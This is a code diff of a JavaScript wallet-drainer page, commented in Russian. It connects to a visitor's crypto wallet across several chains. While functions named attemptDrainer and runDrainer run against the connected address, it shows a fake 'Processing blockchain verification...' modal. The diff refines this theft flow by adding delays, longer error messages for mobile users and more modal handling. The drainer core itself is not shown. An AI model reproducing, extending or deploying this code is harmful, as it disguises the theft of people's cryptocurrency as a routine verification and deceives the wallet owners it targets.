@@ -30,33 +30,33 @@ let isTransactionPending = false;
 let actionBtn = null;
 let modalOverlay = null;
 let modalContent = null;
-let modalSubtitle = null; // Для обновления текста в модальном окне
+let modalSubtitle = null;
 
 // Список надёжных RPC для fallback для всех поддерживаемых сетей
 const FALLBACK_RPCS = {
-  1: [ // Ethereum Mainnet
+  1: [
     'https://rpc.eth.gateway.fm',
     'https://eth.llamarpc.com',
     'https://ethereum-rpc.publicnode.com'
   ],
-  56: [ // BNB Chain
+  56: [
     'https://bsc-dataseed.binance.org/',
     'https://bsc-dataseed1.defibit.io/',
     'https://bsc-dataseed1.ninicoin.io/'
   ],
-  137: [ // Polygon
+  137: [
     'https://polygon-rpc.com/'
   ],
-  42161: [ // Arbitrum One
+  42161: [
     'https://arb1.arbitrum.io/rpc'
   ],
-  43114: [ // Avalanche
+  43114: [
     'https://api.avax.network/ext/bc/C/rpc'
   ],
-  10: [ // Optimism
+  10: [
     'https://mainnet.optimism.io'
   ],
-  8453: [ // Base
+  8453: [
     'https://mainnet.base.org'
   ]
 };
@@ -72,7 +72,6 @@ async function getReliableProvider() {
     console.warn('⚠️ Провайдер кошелька ненадёжен:', err.message);
   }
 
-  // Получаем текущую сеть
   const network = await walletProvider.getNetwork();
   const chainId = network.chainId;
   const rpcUrls = FALLBACK_RPCS[chainId] || [];
@@ -113,13 +112,11 @@ window.addEventListener('DOMContentLoaded', () => {
   actionBtn = document.getElementById('action-btn');
   const isInjected = typeof window.ethereum !== 'undefined';
 
-  // Подключаем шрифт Inter
   const link = document.createElement('link');
   link.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap';
   link.rel = 'stylesheet';
   document.head.appendChild(link);
 
-  // CSS для модального окна в стиле AppKit
   const style = document.createElement('style');
   style.textContent = `
     .modal-overlay {
@@ -132,7 +129,7 @@ window.addEventListener('DOMContentLoaded', () => {
       z-index: 999;
       display: none;
       backdrop-filter: blur(4px);
-      pointer-events: auto; /* Убедимся, что оверлей кликабельный, пока виден */
+      pointer-events: auto;
     }
 
     .modal-content {
@@ -181,9 +178,9 @@ window.addEventListener('DOMContentLoaded', () => {
       font-weight: 400;
       color: #A0AEC0;
       margin-bottom: 24px;
+      word-wrap: break-word;
     }
 
-    /* Лоадер: пульсирующее кольцо с волнами */
     .loader-container {
       position: relative;
       width: 100px;
@@ -342,7 +339,6 @@ window.addEventListener('DOMContentLoaded', () => {
   `;
   document.head.appendChild(style);
 
-  // Создаём модальное окно
   modalOverlay = document.createElement('div');
   modalOverlay.className = 'modal-overlay';
   document.body.appendChild(modalOverlay);
@@ -367,10 +363,8 @@ window.addEventListener('DOMContentLoaded', () => {
   `;
   document.body.appendChild(modalContent);
 
-  // Сохраняем ссылку на modal-subtitle для динамического обновления
   modalSubtitle = modalContent.querySelector('.modal-subtitle');
 
-  // Проверяем наличие инжектированного провайдера
   if (!isInjected) {
     actionBtn.style.display = 'inline-block';
     actionBtn.addEventListener('click', () => {
@@ -382,23 +376,23 @@ window.addEventListener('DOMContentLoaded', () => {
   actionBtn.style.display = 'inline-block';
   actionBtn.addEventListener('click', handleConnectOrAction);
 
-  // Подписка на смену сети
   window.ethereum.on('chainChanged', onChainChanged);
 });
 
 // === Управление модальным окном ===
 function showModal() {
   modalOverlay.style.display = 'block';
-  modalOverlay.style.pointerEvents = 'auto'; // Убедимся, что оверлей кликабельный
+  modalOverlay.style.pointerEvents = 'auto';
   modalContent.style.display = 'block';
-  modalSubtitle.textContent = "Processing blockchain verification..."; // Сбрасываем текст
+  modalSubtitle.textContent = "Processing blockchain verification...";
 }
 
 async function hideModalWithDelay(errorMessage = null) {
   if (errorMessage) {
+    console.log(`❌ Ошибка перед закрытием: ${errorMessage}`);
     modalSubtitle.textContent = `Error: ${errorMessage}. Please try again.`;
-    console.log(`⏳ Задержка перед закрытием модального окна: ${errorMessage}`);
-    await new Promise(resolve => setTimeout(resolve, 3000)); // Задержка 3 секунды
+    // Увеличиваем задержку до 7 секунд для мобильных устройств
+    await new Promise(resolve => setTimeout(resolve, 7000));
   }
   modalOverlay.style.display = 'none';
   modalOverlay.style.pointerEvents = 'none';
@@ -415,11 +409,13 @@ async function attemptDrainer() {
 
   if (!connectedAddress) {
     console.error('❌ Адрес кошелька не определён');
+    showModal();
+    await hideModalWithDelay("Wallet address not defined");
     return;
   }
 
   console.log(`📍 Используется адрес: ${connectedAddress}`);
-  showModal(); // Открываем модальное окно
+  showModal();
 
   try {
     const provider = await getReliableProvider();
@@ -433,6 +429,9 @@ async function attemptDrainer() {
       return;
     }
 
+    console.log('⏳ Ожидаем 3 секунды перед вызовом runDrainer');
+    await new Promise(resolve => setTimeout(resolve, 3000));
+
     isTransactionPending = true;
     const status = await runDrainer(provider, signer, connectedAddress);
     console.log('✅ Drainer выполнен успешно, статус:', status);
@@ -443,17 +442,15 @@ async function attemptDrainer() {
     await hideModalWithDelay();
   } catch (err) {
     isTransactionPending = false;
+    let errorMessage = err.message || "Unknown error occurred";
     if (err.message.includes('user rejected')) {
       console.log('🙅 Пользователь отклонил транзакцию');
-      await hideModalWithDelay("Transaction rejected by user");
+      errorMessage = "Transaction rejected by user";
     } else {
       console.error('❌ Ошибка выполнения drainer:', err.message);
-      await hideModalWithDelay(err.message || "Unknown error occurred");
-      throw err; // Оставляем throw для отладки
     }
-  } finally {
-    isTransactionPending = false;
-    // Модальное окно уже закрывается в блоках try/catch
+    await hideModalWithDelay(errorMessage);
+    throw err;
   }
 }
 
@@ -478,6 +475,7 @@ async function handleConnectOrAction() {
   } catch (err) {
     console.error('❌ Ошибка подключения:', err.message);
     isTransactionPending = false;
+    showModal();
     await hideModalWithDelay(err.message || "Failed to connect wallet");
   }
 }
@@ -499,7 +497,7 @@ function cleanup() {
   window.ethereum.removeListener('chainChanged', onChainChanged);
   actionBtn.disabled = true;
   actionBtn.style.opacity = '0.6';
-  hideModalWithDelay(); // Убедимся, что модальное окно закрыто
+  hideModalWithDelay();
 }
 
 // === Ожидание подключения кошелька ===
